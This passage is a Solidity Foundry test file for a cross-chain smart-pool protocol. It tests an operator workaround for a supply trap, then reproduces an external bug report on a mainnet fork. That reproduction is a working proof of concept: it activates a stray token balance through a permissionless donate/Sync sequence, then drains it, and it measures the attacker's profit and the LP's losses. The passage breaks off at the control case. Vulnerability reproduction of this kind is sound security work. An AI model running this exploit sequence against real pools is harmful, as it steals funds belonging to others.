            burnt = _modelledBurnt(wSized);
        }
    }

    /// @notice Anchor the trap: the FULL-WETH return leg must revert EffectiveSupplyTooLow and write
    ///         nothing. Mainnet fork must be selected with the move mock installed.
    function _anchorTrapFullReturn(uint256 wethAmount, uint256 m) internal {
        try this.trySingleReturnLeg(wethAmount) {
            revert("trap anchor: the full return must revert");
        } catch (bytes memory err) {
            assertEq(err.length, 4, "trap anchor: custom error payload");
            bytes4 sel;
            assembly {
                sel := mload(add(err, 32))
            }
            assertEq(sel, NavImpactLib.EffectiveSupplyTooLow.selector, "trap anchor: EffectiveSupplyTooLow");
        }
        assertEq(_readVS(ethereum.pool), int256(m), "trap anchor: the reverted initiation wrote nothing");
    }

    /// @notice Attempt to Sync out the leftover WETH dust. Two measured outcomes: when the partial
    ///         return left Eth VS at EXACTLY 0, ES = 0 and validateNavImpact's "no effective supply"
    ///         bypass lets the dust leave - Eth ends fully clean. With a positive remainder (loss),
    ///         ES > 0: impact = 10000bps > 800bps -> NavImpactTooHigh and the dust stays.
    /// @dev Mainnet fork must be selected; returns true when the expected revert is observed.
    function _tryDustSyncOut(uint256 dust) internal returns (bool reverted) {
        try this.trySingleSyncOut(dust) {
            return false;
        } catch (bytes memory err) {
            bytes4 syncSel;
            assembly {
                syncSel := mload(add(err, 32))
            }
            assertEq(syncSel, NavImpactLib.NavImpactTooHigh.selector, "dust sync-out: NavImpactTooHigh");
            return true;
        }
    }

    /// @notice Step 4: fill the partial return on Base (arrival writes +VS at the pre-arrival u),
    ///         then assess burnability. GAIN: Base VS positive, no pin, 100% burns (zero reverts),
    ///         the claimless excess stays behind. LOSS: VS still negative but relieved; measure
    ///         max-burnable (validateSupply wall) and the locked tail. Base fork is selected.
    function _assessBaseBurn(
        PartialReturnState memory p,
        uint256 burnt1,
        uint256 maxBurnableBefore
    ) internal returns (PartialReturnState memory) {
        int256 vsBaseBefore = _readVS(base.pool);
        uint256 uBasePreArrival = _u(base.pool);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, p.wUsed);
        p.minted2 = uint256(_readVS(base.pool) - vsBaseBefore);
        console2.log("  legs: minted2 (Base arrival):", p.minted2, "at u:", uBasePreArrival);

        p.baseVSFinal = _readVS(base.pool);
        p.coverageBps = _claimsAssetsBps(base.pool);
        (p.closureGap, ) = _assertNavClosure(base.pool, "partial return Base");
        uint256 userUsdc0 = IERC20(Constants.BASE_USDC).balanceOf(user);
        uint256 userWeth0 = IERC20(Constants.BASE_WETH).balanceOf(user);
        if (p.ticks > 0) {
            // GAIN: Base VS must land POSITIVE (the +(V1-V0)/par class), NO pin: 100% burns
            assertGt(p.baseVSFinal, 0, "gain: Base VS positive after the partial return");
            assertLt(p.baseVSFinal, int256(burnt1) / 4, "gain: Base VS is the small gain residual class");
            _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, 0);
            p.fullBurn = ISmartPoolState(base.pool).getPoolTokens().totalSupply == 0;
            assertTrue(p.fullBurn, "gain: 100% of Base supply burned with zero reverts");
            // the positive VS is claimless NAV stranded on Base (the next minter's sweep surface):
            // claims are 0, so the closure identity gives V_end == VS*u/1e6 exactly
            uint256 uEnd = _u(base.pool);
            uint256 vEnd = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
            assertApproxEqRel(
                vEnd,
                (uint256(p.baseVSFinal) * uEnd) / 1e6,
                0.02e18,
                "gain: the claimless excess ~= VS*u/1e6 stays behind"
            );
            console2.log("  gain: claimless NAV stranded on Base (raw):", vEnd);
        } else {
            // LOSS: Base VS still negative but RELIEVED; quantify max burnable + the locked tail
            assertLt(p.baseVSFinal, 0, "loss: Base VS still negative (the documented residual class)");
            assertGt(p.baseVSFinal, -int256(burnt1), "loss: the partial return relieved Base's pin");
            uint256 vsAbs = uint256(-p.baseVSFinal);
            p.lockedTail = (vsAbs * 20 + 18) / 19; // ceil(20|VS|/19)
            p.maxBurnable = ISmartPoolState(base.pool).getPoolTokens().totalSupply - p.lockedTail;
            _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, p.lockedTail);
            vm.prank(user);
            vm.expectRevert(NavImpactLib.EffectiveSupplyTooLow.selector);
            ISmartPoolActions(base.pool).burn(1, 0); // one share beyond the wall reverts
            assertGt(p.maxBurnable, maxBurnableBefore, "loss: the workaround raised max-burnable vs trapped");
            assertEq(
                ISmartPoolState(base.pool).getPoolTokens().totalSupply,
                p.lockedTail,
                "loss: burned down to the locked tail exactly"
            );
        }
        uint256 userWethOut = IERC20(Constants.BASE_WETH).balanceOf(user) - userWeth0;
        p.userReceived =
            (IERC20(Constants.BASE_USDC).balanceOf(user) - userUsdc0) +
            uint256(
                IEOracle(base.pool).convertTokenAmount(Constants.BASE_WETH, int256(userWethOut), Constants.BASE_USDC)
            );
        return p;
    }

    /// @notice One operator-workaround variant from the post-outbound snapshot: install the move on
    ///         both oracles, anchor the trap (full return reverts), size + initiate the partial
    ///         return, fill it on Base, then burn Base down. Ends on the Base fork.
    function _runPartialReturnVariant(
        int24 ticks,
        uint256 wethAmount,
        uint256 burnt1,
        uint256 m,
        uint256 maxBurnableBefore
    ) internal returns (PartialReturnState memory p) {
        p.ticks = ticks;
        p.m = m;
        vm.clearMockedCalls(); // mockCall state survives revertTo - install from the REAL ticks
        vm.selectFork(mainnetForkId);
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, ticks);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, ticks);

        // -- anchor the trap: the FULL-WETH return leg must revert EffectiveSupplyTooLow --
        vm.selectFork(mainnetForkId);
        uint256 wethBal = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        _anchorTrapFullReturn(wethAmount, m);

        // -- step 1: size the partial return off-chain (pool's own oracle + u, deterministic same block) --
        (p.wSized, p.burntModeled, p.windowWei, p.exactZero) = _sizePartialReturn(wethBal, m);
        uint256 remainder = m - p.burntModeled; // 0 when the exact-equality window exists
        assertLe(remainder, 2, "sizing: the minimal positive remainder is at most 2 raw share units");
        console2.log("  sizing: candidate (wei) / modeled burn / remainder:", p.wSized, p.burntModeled, remainder);
        console2.log("  sizing: exact-zero window (wei):", p.windowWei);

        // execute the partial return; on an unexpected revert, retry strictly smaller (always succeeds)
        p.wUsed = p.wSized;
        uint256 quantum = (2 * wethBal) / m; // ~2 raw units of value in wei
        bool initiated;
        for (uint256 attempt = 0; attempt < 5 && !initiated; attempt++) {
            uint256 snap = vm.snapshot();
            try this.tryPartialReturnLeg(p.wUsed) {
                initiated = true;
            } catch {
                assertTrue(vm.revertTo(snap), "partial return retry: revert the failed initiation");
                assertGt(p.wUsed, quantum, "partial return retry: exhausted");
                p.wUsed -= quantum;
            }
        }
        assertTrue(initiated, "partial return: initiation succeeded");
        p.burntActual = m - uint256(_readVS(ethereum.pool));
        assertEq(p.burntActual, p.burntModeled, "partial return: the on-chain burn matches the model");
        p.ethVSFinal = _readVS(ethereum.pool);
        p.ethWethDust = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        p.ethDustValue = uint256(
            IEOracle(ethereum.pool).convertTokenAmount(Constants.ETH_WETH, int256(p.ethWethDust), Constants.ETH_USDC)
        );
        assertEq(ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply, 0, "Eth TS stays 0");
        assertGt(p.ethWethDust, 0, "the full return reverted, so the candidate leaves dust");
        assertLe(p.ethDustValue, 10e6, "the dust is worth < 10 raw base units (~1 base unit)");
        console2.log("  legs: burnt2 (Eth partial return):", p.burntActual);

        // -- step 3: the dust Sync-out - measured, not assumed: VS = 0 bypasses the tolerance
        //      (ES = 0 -> "no effective supply, allow any transfer") and the dust LEAVES; a
        //      positive remainder (the u_E < 1e6 window-skip fallback) keeps ES > 0 and reverts
        //      NavImpactTooHigh (impact 10000bps > 800bps), so the dust would stay --
        console2.log("  dust pre-sync (wei) / value (raw):", p.ethWethDust, p.ethDustValue);
        p.dustSyncReverted = _tryDustSyncOut(p.ethWethDust);
        uint256 dustAfter = IERC20(Constants.ETH_WETH).balanceOf(ethereum.pool);
        if (p.dustSyncReverted) {
            assertEq(dustAfter, p.ethWethDust, "the reverted sync leaves the dust in place");
        } else {
            assertEq(dustAfter, 0, "gain: the dust sync leaves Eth with zero assets");
            p.ethWethDust = 0;
            p.ethDustValue = 0;
        }

        // -- step 4: fill on Base, then assess + burn down --
        vm.selectFork(baseForkId);
        p = _assessBaseBurn(p, burnt1, maxBurnableBefore);
    }

    function _logPartialReturn(string memory name, PartialReturnState memory p) internal pure {
        console2.log("==== PARTIAL-RETURN WORKAROUND", name);
        console2.log("  Eth VS to unwind m (raw):", p.m);
        console2.log("  sizing: candidate (wei):", p.wSized);
        console2.log("  sizing: modeled burn / actual burn:", p.burntModeled, p.burntActual);
        console2.log("  sizing: exact-zero window (wei):", p.windowWei);
        console2.log("  Eth: VS final (0 or remainder):", p.ethVSFinal);
        console2.log("  Eth: WETH dust (wei) / value (raw):", p.ethWethDust, p.ethDustValue);
        console2.log("  Eth: dust sync-out reverted (stays):", p.dustSyncReverted);
        console2.log("  Base: VS final (raw):", p.baseVSFinal);
        console2.log("  Base: minted2 (raw):", p.minted2);
        console2.log("  Base: coverage (claims/assets bps):", p.coverageBps);
        console2.log("  Base: closure gap (raw):", p.closureGap);
        console2.log("  Base: full burn (gain):", p.fullBurn);
        console2.log("  Base: max burnable / locked tail (loss):", p.maxBurnable, p.lockedTail);
        console2.log("  Base: user received while burning (raw):", p.userReceived);
    }

    /// @notice OPERATOR WORKAROUND for the TS=0 return trap (the reverted variants of
    ///         test_SingleSupplyChainGeometry_WethRoundTrip), gain and loss variants. The trap:
    ///         Eth (TS=0, VS=m) cannot initiate the FULL-WETH return because the source-leg burn
    ///         overshoots m (u floors below V/ES) and TS=0 admits no negative VS. But ANY smaller
    ///         amount whose burn stays <= m initiates fine (validateSupply only bites on VS < 0).
    ///
    ///         THE WORKAROUND: initiate a partial return sized so the source-leg burn lands EXACTLY
    ///         on m (off-chain sizing against the pool's own oracle + u; binary search, then one
    ///         real initiation - the model is exact because initiation is deterministic same-block).
    ///         The exact-equality window has width u_E/1e6 raw units of value: GAIN (+10%, u_E ~=
    ///         1.1e6) always contains candidates; LOSS (-10%, u_E ~= 0.9e6 < 1e6) can skip m - MEASURED
    ///         at these +/-10% fractions the window exists in BOTH variants (the loss skip is a
    ///         fractional possibility, handled as a <= 2 raw remainder fallback in _sizePartialReturn),
    ///         so Eth unwinds to EXACTLY VS = 0, TS = 0 in both.
    ///
    ///         THE DUST: the leftover sub-$10 WETH dust then Syncs OUT - with VS = 0 the pool has
    ///         ES = 0 and validateNavImpact's "no effective supply, allow any transfer" bypass skips
    ///         the tolerance check - so Eth ends with ZERO assets (the fill of the dust sync on Base
    ///         is deliberately not simulated: a VS-less value-in would break Base's closure-identity
    ///         bound for a ~$1 amount). With a positive remainder instead (the fallback), ES > 0 and
    ///         the sync reverts NavImpactTooHigh (impact 10000bps > 800bps): the dust would stay.
    ///
    ///         BASE (step 4): the arrival credits minted2 = value/u_Base at the PRE-arrival u. GAIN:
    ///         Base VS lands POSITIVE (the +(V1-V0)/par class): no pin, and 100% of the supply
    ///         burns with zero reverts; the positive VS stays behind as claimless NAV (the next
    ///         minter's sweep surface). LOSS: Base VS stays negative but RELIEVED (-(V0-V1)/par
    ///         class), and max-burnable rises from the trapped state's validateSupply wall (only
    ///         ~47% of the supply payable, the USDC wallet nearly dry) to ~95%: the stuck exposure
    ///         shrinks to the documented locked-tail class.
    function test_TsZeroTrap_PartialReturnPlusSync() public {
        // ===== substrate shared by both variants: same geometry as the trap matrix =====
        _deployPureUsdcScenario(WETH_LOSS_EXTRA_MINT);
        (uint256 wethAmount, ) = _buildWethLossBook();
        _emptyEthPool();
        (uint256 burnt1, uint256 minted1) = _singleSupplyOutbound(wethAmount);
        console2.log("==== POST-OUTBOUND GEOMETRY (shared)");
        console2.log("  Base VS (=-value/u0):", burnt1);
        console2.log("  Eth VS (=arrival value at sentinel):", minted1);
        ForkSnapshot memory snapshot1 = _snapshotBoth();

        // ===== trapped-state Base burnability (shared number for both variants) =====
        // Base holds ONLY USDC in the trapped state (the WETH half is on Eth): burns pay out at
        // u ~= 1.002e6 until the validateSupply wall (ceil(20|VS|/19)) - the supply wall binds
        // with the USDC wallet nearly dry (coverage ~50%), so barely ~47% of the supply burns
        // and the rest locks with ~no value left to pay it.
        uint256 maxBurnableBefore;
        {
            vm.selectFork(baseForkId);
            uint256 tsTrapped = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
            uint256 supplyWallTrapped = (burnt1 * 20 + 18) / 19; // ceil(20|VS|/19)
            uint256 usdcTrapped = IERC20(Constants.BASE_USDC).balanceOf(base.pool);
            uint256 snapTrapped = vm.snapshot();
            uint256 guard;
            while (ISmartPoolState(base.pool).getPoolTokens().totalSupply > supplyWallTrapped) {
                uint256 u = _poolTokens(base.pool).unitaryValue;
                uint256 ts = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
                uint256 chunk = (IERC20(Constants.BASE_USDC).balanceOf(base.pool) * 1e6) / u;
                uint256 room = ts - supplyWallTrapped;
                if (chunk > room) chunk = room;
                vm.prank(user);
                ISmartPoolActions(base.pool).burn(chunk, 0);
                require(++guard < 10, "trapped burn loop did not converge");
            }
            assertEq(
                ISmartPoolState(base.pool).getPoolTokens().totalSupply,
                supplyWallTrapped,
                "trapped: burned down to the supply wall exactly"
            );
            vm.prank(user);
            vm.expectRevert(NavImpactLib.EffectiveSupplyTooLow.selector);
            ISmartPoolActions(base.pool).burn(1, 0); // one share beyond the wall reverts
            maxBurnableBefore = tsTrapped - supplyWallTrapped;
            uint256 usdcLeft = IERC20(Constants.BASE_USDC).balanceOf(base.pool);
            assertLt(usdcLeft, usdcTrapped / 4, "trapped: the burn run nearly dried the USDC wallet");
            assertEq(IERC20(Constants.BASE_WETH).balanceOf(base.pool), 0, "trapped: no WETH to redeem");
            assertTrue(vm.revertTo(snapTrapped), "restore the trapped Base state");
            console2.log("  trapped Base: max burnable (raw):", maxBurnableBefore);
            console2.log("  trapped Base: supply wall (raw):", supplyWallTrapped);
            console2.log("  trapped Base: USDC left after the burn run (raw):", usdcLeft);
        }

        // ===== the two variants from the shared post-outbound snapshot =====
        int24[2] memory ticksMatrix = [TICKS_10PCT, -TICKS_10PCT];
        string[2] memory names = ["GAIN", "LOSS"];
        for (uint256 i = 0; i < 2; i++) {
            _revertBoth(snapshot1); // consume (snapshots are one-shot)...
            snapshot1 = _snapshotBoth(); // ...and immediately re-capture the CLEAN state
            PartialReturnState memory p = _runPartialReturnVariant(
                ticksMatrix[i],
                wethAmount,
                burnt1,
                minted1,
                maxBurnableBefore
            );
            _logPartialReturn(names[i], p);
            if (uint256(p.ethVSFinal) == 0) {
                // measured at +/-10% for BOTH variants: the exact-equality window exists (m not
                // skipped), Eth is at EXACTLY VS = 0, and the dust Syncs OUT - with ES = 0 the
                // validateNavImpact tolerance is bypassed ("no effective supply, allow any transfer")
                assertTrue(p.exactZero, "exact zero: the equality window was found");
                assertTrue(!p.dustSyncReverted, "VS = 0 -> ES = 0 -> the dust syncs out, Eth fully clean");
            } else {
                // the documented fallback (u_E < 1e6 window skip, <= 2 raw remainder): the dust
                // cannot Sync out - ES > 0 and the impact check fires (10000bps > 800bps)
                assertLe(uint256(p.ethVSFinal), 2, "fallback: Eth ends at the minimal positive remainder");
                assertTrue(p.dustSyncReverted, "ES > 0 -> the dust sync reverts NavImpactTooHigh");
            }
        }
        console2.log("==== WORKAROUND VERDICT");
        console2.log("  (a) Base funds: gain = 100% burnable (users whole minus spread); loss = max-burnable");
        console2.log("      lifted far above the trapped-state wall, locked tail = 20|VS|/19 class");
        console2.log("  (b) Eth clean: at +/-10% BOTH variants land at EXACTLY VS = 0 (the m-skip fallback");
        console2.log("      is fractional, documented in _sizePartialReturn); the dust syncs out via the");
        console2.log("      ES=0 tolerance bypass - Eth ends with TS = 0, VS = 0, ZERO assets");
        console2.log("  (c) gain: full supply burns with zero reverts; (d) loss: stuck exposure shrinks to");
        console2.log("      the documented negative-residual class, smaller than the trapped state");
    }

    /*//////////////////////////////////////////////////////////////////////////
        STRAY-BALANCE JIT CAPTURE via Sync activation (external report, deviykee)
        //////////////////////////////////////////////////////////////////////////*/

    struct StrayCaptureState {
        uint256 principal; // attacker's minted base value (raw USDC)
        uint256 strayWeth; // wei dealt to the pool before activation
        uint256 strayValue; // stray value in raw USDC (pool oracle)
        uint256 uBeforeActivate; // 1e6: the stray is invisible to NAV
        uint256 uAfterActivate; // jumped: the whole stray folded into NAV, no supply offset
        uint256 attackerWethOut; // wei captured via burnForToken
        uint256 attackerUsdcOut; // raw USDC recovered via burn
        uint256 attackerValueOut; // USDC-worth of the attacker's total payout
        int256 profit; // valueOut - principal
        uint256 sharesLeft; // unpayable tail (payout exceeds the wallet)
    }

    /// @notice Burn shares paying the base token (external so try/catch can catch it)
    function tryDrainBurn(address caller, address pool, uint256 amount) external {
        vm.prank(caller);
        ISmartPoolActions(pool).burn(amount, 0);
    }

    /// @notice Burn shares valued `amount` (base units), paid in WETH (external for try/catch)
    function tryDrainBurnForToken(address caller, address pool, uint256 amount, address tokenOut) external {
        vm.prank(caller);
        ISmartPoolActions(pool).burnForToken(amount, 0, tokenOut);
    }

    /// @notice Create a fresh USDC-based pool on the mainnet fork (real factory, real oracle)
    function _createFreshUsdcPool(string memory name, string memory symbol) internal returns (address pool) {
        vm.prank(poolOwner);
        (pool, ) = IRigoblockPoolProxyFactory(Constants.FACTORY).createPool(name, symbol, Constants.ETH_USDC);
    }

    /// @notice THE 3-STEP ATTACK: donate(token, 1, Sync) snapshots balance+NAV, a 2-wei top-up, then
    ///         donate(token, 2, Sync) processes the delta. On FIRST activation _validateNavIntegrity
    ///         credits the ENTIRE pre-existing storedBalance into expected NAV while OpType.Sync
    ///         writes NO virtual supply - the whole stray balance folds into NAV with no supply
    ///         offset, and the only other guard (NavDecreased) passes because u INCREASES.
    /// @dev Runs as the attacker. Production requires all three calls inside ONE transaction
    ///      (the donation lock is EIP-1153 transient storage); Foundry persists tstore across test
    ///      calls, so the steps can be separate top-level calls here.
    function _activateStray(address pool, address attacker) internal {
        DestinationMessageParams memory params = DestinationMessageParams({
            opType: OpType.Sync,
            shouldUnwrapNative: false
        });
        vm.startPrank(attacker);
        IECrosschain(pool).donate(Constants.ETH_WETH, 1, params);
        IERC20(Constants.ETH_WETH).transfer(pool, 2);
        IECrosschain(pool).donate(Constants.ETH_WETH, 2, params);
        vm.stopPrank();
    }

    /// @notice True when `token` is in the pool's active token set (NAV counts its balance)
    function _isActiveToken(address pool, address token) internal view returns (bool) {
        address[] memory active = ISmartPoolState(pool).getActiveTokens().activeTokens;
        for (uint256 i = 0; i < active.length; i++) {
            if (active[i] == token) return true;
        }
        return false;
    }

    /// @notice Burn `caller`'s ENTIRE balance in payable chunks (base first, then WETH via
    ///         burnForToken), stopping when neither wallet can pay. Mirrors the existing
    ///         _operatorBurnEthDry chunking: the pool outflow per share unit is exactly u/1e6
    ///         (0.999 net + 0.001 to the token jar), so a wallet-sized chunk never overdraws.
    /// @return wethOut / usdcOut value received (delta), sharesLeft unpayable remainder
    function _drainShares(
        address caller,
        address pool
    ) internal returns (uint256 wethOut, uint256 usdcOut, uint256 sharesLeft) {
        uint256 weth0 = IERC20(Constants.ETH_WETH).balanceOf(caller);
        uint256 usdc0 = IERC20(Constants.ETH_USDC).balanceOf(caller);
        sharesLeft = ISmartPoolState(pool).balanceOf(caller);
        uint256 guard;
        while (sharesLeft > 0) {
            require(++guard < 30, "drain did not converge");
            uint256 u = _u(pool);
            uint256 chunk;
            bool burned;
            uint256 maxByUsdc = (IERC20(Constants.ETH_USDC).balanceOf(pool) * 1e6) / u;
            if (maxByUsdc > 0) {
                chunk = sharesLeft < maxByUsdc ? sharesLeft : maxByUsdc;
                try this.tryDrainBurn(caller, pool, chunk) {
                    sharesLeft -= chunk;
                    burned = true;
                } catch {}
            }
            if (!burned) {
                uint256 wethBal = IERC20(Constants.ETH_WETH).balanceOf(pool);
                uint256 maxByWeth = (uint256(
                    IEOracle(pool).convertTokenAmount(Constants.ETH_WETH, int256(wethBal), Constants.ETH_USDC)
                ) * 1e6) / u;
                if (maxByWeth > 0) {
                    chunk = sharesLeft < maxByWeth ? sharesLeft : maxByWeth;
                    try this.tryDrainBurnForToken(caller, pool, chunk, Constants.ETH_WETH) {
                        sharesLeft -= chunk;
                        burned = true;
                    } catch {}
                }
            }
            if (!burned) break; // both wallets dust-dry: the remainder is unpayable
        }
        wethOut = IERC20(Constants.ETH_WETH).balanceOf(caller) - weth0;
        usdcOut = IERC20(Constants.ETH_USDC).balanceOf(caller) - usdc0;
    }

    function _logStrayCapture(string memory name, StrayCaptureState memory s) internal pure {
        console2.log("==== STRAY CAPTURE", name);
        console2.log("  principal (raw):", s.principal);
        console2.log("  stray WETH (wei) / value (raw):", s.strayWeth, s.strayValue);
        console2.log("  u before / after activation:", s.uBeforeActivate, s.uAfterActivate);
        console2.log("  attacker WETH out (wei):", s.attackerWethOut);
        console2.log("  attacker USDC out (raw):", s.attackerUsdcOut);
        console2.log("  attacker value out (raw):", s.attackerValueOut);
        console2.log("  attacker profit (raw):", s.profit);
        console2.log("  attacker shares left unpayable (raw):", s.sharesLeft);
    }

    /// @notice EXTERNAL BUG REPORT (researcher deviykee), replicated on the mainnet fork.
    ///         ECrosschain.donate is permissionless (ECrosschain.sol:23). donate(token, 1, params)
    ///         snapshots the balance + NAV (lines 50-58); a second donate after a top-up processes
    ///         the delta; on FIRST ACTIVATION _validateNavIntegrity adds the ENTIRE pre-existing
    ///         storedBalance into expected NAV (lines 147-153); OpType.Sync writes NO virtual supply
    ///         (lines 97-102); the only other guard is unitaryValue >= storedNav (line 171) - an
    ///         INCREASE is unrestricted. So a stray (lost) token balance that predates activation
    ///         can be folded into NAV with no supply offset by ANYONE: u jumps, and the activator's
    ///         existing shares (minted while the stray was invisible) are redeemable against it.
    ///
    ///         MEASURED ANSWERS: (1) the 3-step sequence runs exactly as the report describes - no
    ///         deviation needed; the NavDecreased guard does NOT interfere because the activation is
    ///         always a u-INCREASE, and the balance/whitelist/amountDelta checks all pass by
    ///         construction. (2) Variant 1 (empty pool): the attacker - sole LP via a ~1 ETH mint -
    ///         captures ~ALL of the 50 WETH stray (report claimed ~45.85/50: AGREES IN KIND, ours is
    ///         stronger because the attacker is the only claimant). (3) Variant 2 (existing ~1 ETH
    ///         LP + attacker ~1 ETH): the attacker captures ~HALF the 20 WETH stray; the LP's shares
    ///         are unchanged and his claim RISES by the other half - the LP's principal is NOT
    ///         impaired (the pool stays solvent for him); what he loses vs the no-attacker
    ///         counterfactual is half the stray uplift, which is exactly the attacker's take.
    ///         (4) Control: when the WETH arrived via a proper mintWithToken (activated and
    ///         accounted - shares issued against the full value), the same actions capture NOTHING:
    ///         the attacker's burn pays back only his own principal minus the spread.
    function test_StrayBalance_JitCapture_ViaSyncActivate() public {
        // the fixture creates the forks; this test only uses the mainnet fork + the real factory
        address[] memory baseTokens = new address[](2);
        baseTokens[0] = Constants.ETH_USDC;
        baseTokens[1] = Constants.BASE_USDC;
        deployFixture(baseTokens);
        vm.selectFork(mainnetForkId);
        address attacker = makeAddr("strayAttacker");
        vm.deal(attacker, 2 ether); // the report's "~2 ETH" attacker funding

        // ================= VARIANT 1: empty pool (the report's main case) =================
        console2.log("==== VARIANT 1: EMPTY POOL");
        StrayCaptureState memory v1;
        address pool1 = _createFreshUsdcPool("StrayOne", "STRY1");
        v1.strayWeth = 50e18;
        deal(Constants.ETH_WETH, pool1, v1.strayWeth); // the stray: plain balance, token NOT active
        deal(Constants.ETH_WETH, attacker, 2); // 2 wei for the top-up step

        // attacker mints ~1 ETH of base while the stray is invisible to NAV
        v1.principal = uint256(IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
        deal(Constants.ETH_USDC, attacker, v1.principal);
        vm.startPrank(attacker);
        IERC20(Constants.ETH_USDC).approve(pool1, v1.principal);
        ISmartPool(payable(pool1)).mint(attacker, v1.principal, 0);
        vm.stopPrank();
        v1.uBeforeActivate = _u(pool1);
        v1.strayValue = uint256(
            IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, int256(v1.strayWeth), Constants.ETH_USDC)
        );
        assertEq(v1.uBeforeActivate, 1e6, "stray invisible: u pinned at par after the mint");
        assertTrue(!_isActiveToken(pool1, Constants.ETH_WETH), "stray invisible: WETH not active");

        // the 3-step donate sequence (permissionless, executed by the attacker)
        _activateStray(pool1, attacker);
        v1.uAfterActivate = _u(pool1);
        assertTrue(_isActiveToken(pool1, Constants.ETH_WETH), "attack: WETH activated");
        assertGt(v1.uAfterActivate, 10e6, "attack: u jumped by the stray/supply ratio");
        assertApproxEqRel(
            v1.uAfterActivate,
            (1e6 * (ISmartPoolActions(pool1).updateUnitaryValue().netTotalValue * 1e6)) /
                ISmartPoolState(pool1).getPoolTokens().totalSupply /
                1e6,
            0.02e18,
            "attack: u == V/TS (whole stray in NAV, no supply offset)"
        );

        // wait out the minPeriod lock on the attacker's mint, then capture
        _warpPastLockup(pool1);
        (v1.attackerWethOut, v1.attackerUsdcOut, v1.sharesLeft) = _drainShares(attacker, pool1);
        v1.attackerValueOut =
            v1.attackerUsdcOut +
            uint256(
                IEOracle(pool1).convertTokenAmount(Constants.ETH_WETH, int256(v1.attackerWethOut), Constants.ETH_USDC)
            );
        v1.profit = int256(v1.attackerValueOut) - int256(v1.principal);
        _logStrayCapture("VARIANT 1 (empty pool, 50 WETH stray)", v1);
        assertGt(v1.attackerWethOut, 45e18, "agrees in kind with the report's ~45.85/50 - here ~all of it");
        assertApproxEqRel(v1.profit, int256(v1.strayValue), 0.05e18, "profit ~= the whole stray value");
        assertTrue(v1.profit > 0, "the attacker profits from funds that were not his");

        // ================= VARIANT 2: existing LP =================
        console2.log("==== VARIANT 2: EXISTING LP");
        StrayCaptureState memory v2;
        address pool2 = _createFreshUsdcPool("StrayTwo", "STRY2");
        uint256 lpPrincipal = uint256(IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
        deal(Constants.ETH_USDC, user, lpPrincipal);
        vm.startPrank(user);
        IERC20(Constants.ETH_USDC).approve(pool2, lpPrincipal);
        ISmartPool(payable(pool2)).mint(user, lpPrincipal, 0);
        vm.stopPrank();
        _warpPastLockup(pool2); // the LP is free to burn from here on

        // what the LP could burn for BEFORE the attack (real burn on a throwaway snapshot)
        uint256 lpSharesBefore = ISmartPoolState(pool2).balanceOf(user);
        uint256 lpBurnX;
        {
            uint256 snapLp = vm.snapshot();
            (, uint256 lpUsdcOut, ) = _drainShares(user, pool2);
            lpBurnX = lpUsdcOut;
            assertTrue(vm.revertTo(snapLp), "restore the pre-attack state");
        }
        console2.log("  LP principal (raw):", lpPrincipal);
        console2.log("  LP could burn for X (raw, pre-attack):", lpBurnX);

        // the attack: stray 20 WETH, attacker mints ~1 ETH of base, 3-step activation
        v2.strayWeth = 20e18;
        deal(Constants.ETH_WETH, pool2, v2.strayWeth);
        v2.principal = lpPrincipal; // ~1 ETH of base, matching the LP
        deal(Constants.ETH_USDC, attacker, v2.principal);
        vm.startPrank(attacker);
        IERC20(Constants.ETH_USDC).approve(pool2, v2.principal);
        ISmartPool(payable(pool2)).mint(attacker, v2.principal, 0);
        vm.stopPrank();
        v2.uBeforeActivate = _u(pool2);
        v2.strayValue = uint256(
            IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(v2.strayWeth), Constants.ETH_USDC)
        );
        assertEq(v2.uBeforeActivate, 1e6, "stray invisible: u still par with the LP + attacker mints");
        _activateStray(pool2, attacker);
        v2.uAfterActivate = _u(pool2);
        assertGt(v2.uAfterActivate, 3e6, "attack: u jumped ~3x (20 WETH vs ~2 ETH of supply)");
        assertEq(ISmartPoolState(pool2).balanceOf(user), lpSharesBefore, "LP shares unchanged by the attack");

        // attacker captures his half of the stray
        _warpPastLockup(pool2);
        (v2.attackerWethOut, v2.attackerUsdcOut, v2.sharesLeft) = _drainShares(attacker, pool2);
        v2.attackerValueOut =
            v2.attackerUsdcOut +
            uint256(
                IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(v2.attackerWethOut), Constants.ETH_USDC)
            );
        v2.profit = int256(v2.attackerValueOut) - int256(v2.principal);
        _logStrayCapture("VARIANT 2 (existing LP, 20 WETH stray)", v2);
        assertTrue(v2.profit > 0, "attacker profits with an existing LP too");
        assertGt(v2.attackerWethOut, v2.strayWeth / 4, "attacker skims ~half the stray");

        // LP's realizable value AFTER the attack (real burn, measured on a throwaway snapshot)
        uint256 lpBurnXPrime;
        uint256 snapLp2 = vm.snapshot();
        {
            (uint256 lpWethOut, uint256 lpUsdcOut, ) = _drainShares(user, pool2);
            lpBurnXPrime =
                lpUsdcOut +
                uint256(IEOracle(pool2).convertTokenAmount(Constants.ETH_WETH, int256(lpWethOut), Constants.ETH_USDC));
        }
        assertTrue(vm.revertTo(snapLp2), "restore the post-attack state");
        console2.log("  LP can burn for X' (raw, post-attack):", lpBurnXPrime);
        console2.log("  attacker captured (raw USDC-worth):", v2.attackerValueOut - v2.principal);
        assertGt(lpBurnXPrime, lpBurnX, "LP claim ROSE: his uplift is half the stray (principal intact)");
        assertApproxEqRel(
            uint256(v2.profit),
            v2.strayValue / 2,
            0.35e18,
            "attacker's take ~= half the stray - the half the LP's solo uplift lost"
        );
        console2.log("  solo-activation counterfactual: LP claim ~= X + stray - halved by the attack");

        // ================= CONTROL: accounted WETH is NOT capturable =================
